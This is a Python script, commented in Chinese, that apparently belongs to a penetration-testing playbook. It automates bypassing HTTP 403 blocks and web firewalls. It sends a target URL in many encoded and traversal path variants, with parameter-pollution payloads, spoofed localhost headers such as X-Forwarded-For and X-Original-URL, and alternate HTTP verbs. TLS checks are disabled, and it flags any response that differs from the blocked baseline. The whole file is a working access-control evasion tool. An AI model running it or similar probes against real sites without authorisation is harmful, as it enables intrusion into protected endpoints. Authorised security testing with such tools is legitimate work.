#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
自适应变异调度器（§01 Step 6a）

对同一个请求，按 L1→L5 层级自动生成变异，逐个发送，
对比响应差异，找出能绕过的那一个。

用法:
  # 基础：对 URL 做路径变异
  python3 mutate.py https://target.com/admin

  # 带阻断基线：先记 403 的响应特征，再找能绕过的
  python3 mutate.py https://target.com/admin --baseline-status 403

  # 参数变异
  python3 mutate.py "https://target.com/api?id=1" --mode param

  # 自定义 header 变异
  python3 mutate.py https://target.com/admin --mode header

  # 输出全部（含失败）
  python3 mutate.py https://target.com/admin --all
"""
import argparse, ssl, sys, urllib.parse
import urllib.request, urllib.error

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"


def req(url, method="GET", headers=None, data=None, timeout=12):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    body = data.encode() if isinstance(data, str) else data
    try:
        r = urllib.request.Request(url, data=body, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=timeout, context=CTX) as x:
            return x.status, len(x.read(300000)), dict(x.headers)
    except urllib.error.HTTPError as e:
        return e.code, 0, dict(e.headers)
    except Exception as e:
        return None, 0, {"_err": str(e)[:50]}


# ── L3 路径变异 ──
def path_variants(path):
    p = path.lstrip("/")
    out = [
        ("原值", f"/{p}"),
        ("URL编码", "/" + p.replace("/", "%2f")),
        ("双重编码", "/" + p.replace("/", "%252f")),
        ("全编码", "/" + "".join("%" + hex(ord(c))[2:] for c in p if c != "/")),
        ("双斜杠", f"//{p}"),
        ("点斜杠", f"/./{p}"),
        ("尾部斜杠", f"/{p}/"),
        ("尾部分号", f"/{p};.css"),
        ("尾部点", f"/{p}."),
        ("尾部%20", f"/{p}%20"),
        ("尾部%00", f"/{p}%00.html"),
        ("大写", f"/{p.upper()}"),
        ("上级穿越", f"/./{p}/../{p}"),
        ("问号截断", f"/{p}?x=.css"),
        ("井号截断", f"/{p}#.css"),
        ("分号参数", f"/{p};x=1"),
        ("反斜杠", f"/{p.replace('/', chr(92))}"),
        ("过编UTF8", "/" + p.replace("/", "%c0%af")),
        ("全角点", "/" + p.replace("/", "％２ｆ")),
    ]
    return out


# ── L5 参数变异 ──
def param_variants(query):
    if not query:
        return [("原值", "")]
    parts = dict(urllib.parse.parse_qsl(query, keep_blank_values=True))
    out = [("原值", query)]
    for k, v in parts.items():
        out += [
            (f"{k} HPP", f"{query}&{k}={v}2"),
            (f"{k} 数组", f"{k}[]={v}"),
            (f"{k} 空字节", f"{k}={v}%00"),
            (f"{k} 类型混淆", f"{k}={v}.0"),
            (f"{k} 科学计数", f"{k}={v}e1"),
            (f"{k} 负数", f"{k}=-{v}"),
            (f"{k} 超长", f"{k}={'A'*500}"),
            (f"{k} 换行", f"{k}={v}%0a"),
        ]
    return out[:40]


# ── L4 header 变异 ──
HEADER_VARIANTS = [
    ("原值", {}),
    ("XFF 本地", {"X-Forwarded-For": "127.0.0.1"}),
    ("X-Real-IP", {"X-Real-IP": "127.0.0.1"}),
    ("X-Originating-IP", {"X-Originating-IP": "127.0.0.1"}),
    ("X-Forwarded-Host", {"X-Forwarded-Host": "127.0.0.1"}),
    ("X-Original-URL", {"X-Original-URL": "/"}),
    ("X-Rewrite-URL", {"X-Rewrite-URL": "/"}),
    ("X-Forwarded-Prefix", {"X-Forwarded-Prefix": "/"}),
    ("Referer 内页", {"Referer": "http://127.0.0.1/"}),
    ("表单 CT", {"Content-Type": "application/x-www-form-urlencoded"}),
    ("JSON CT", {"Content-Type": "application/json"}),
    ("X-Custom-IP", {"X-Custom-IP-Authorization": "127.0.0.1"}),
    ("Client-IP", {"Client-IP": "127.0.0.1"}),
    ("X-Client-IP", {"X-Client-IP": "127.0.0.1"}),
    ("Forwarded", {"Forwarded": "for=127.0.0.1;host=127.0.0.1"}),
]

METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE"]


def main():
    ap = argparse.ArgumentParser(description="自适应变异调度器")
    ap.add_argument("url")
    ap.add_argument("--mode", choices=["path", "param", "header", "method", "all"],
                    default="all")
    ap.add_argument("--baseline-status", type=int, help="阻断基线状态码（如 403）")
    ap.add_argument("--all", action="store_true", help="输出全部，不只差异")
    a = ap.parse_args()

    u = urllib.parse.urlsplit(a.url)
    base = f"{u.scheme}://{u.netloc}"
    path = u.path or "/"

    # 基线
    st0, ln0, _ = req(a.url)
    print(f"[基线] {a.url} → {st0}", file=sys.stderr)
    base_status = a.baseline_status or st0

    results = []
    tested = 0

    def try_one(label, url, method="GET", headers=None):
        nonlocal tested
        tested += 1
        st, ln, hd = req(url, method, headers)
        # 判定：状态码变了 或 长度差异明显
        interesting = False
        if st is None:
            interesting = False
        elif st != base_status:
            interesting = True
        elif ln0 and abs(ln - ln0) > max(200, ln0 * 0.15):
            interesting = True
        results.append({"label": label, "url": url, "method": method,
                        "status": st, "len": ln, "interesting": interesting,
                        "loc": hd.get("Location", "")})
        if interesting or a.all:
            mark = "★" if interesting else " "
            print(f" {mark} [{st}] len={ln:<7} {label:<20} {method} {url[:90]}")

    # 按模式执行
    if a.mode in ("path", "all"):
        print("\n=== L3 路径变异 ===", file=sys.stderr)
        for label, vp in path_variants(path):
            try_one(f"路径·{label}", base + vp)

    if a.mode in ("param", "all") and u.query:
        print("\n=== L5 参数变异 ===", file=sys.stderr)
        for label, q in param_variants(u.query):
            try_one(f"参数·{label}", f"{base}{path}?{q}")

    if a.mode in ("header", "all"):
        print("\n=== L4 Header 变异 ===", file=sys.stderr)
        for label, hd in HEADER_VARIANTS:
            try_one(f"头·{label}", a.url, headers=hd)

    if a.mode in ("method", "all"):
        print("\n=== L4 动词变异 ===", file=sys.stderr)
        for m in METHODS:
            try_one(f"动词·{m}", a.url, method=m)

    # 汇总
    hits = [r for r in results if r["interesting"]]
    print(f"\n{'='*60}", file=sys.stderr)
    print(f"[结果] 共试 {tested} 种变异，发现 {len(hits)} 个差异响应", file=sys.stderr)
    for h in hits:
        print(f"  ★ [{h['status']}] {h['label']} → {h['url'][:100]}", file=sys.stderr)

    if hits:
        print("\n[下一步] 差异响应写入 learned.md，继续深挖成功的那条", file=sys.stderr)


if __name__ == "__main__":
    main()
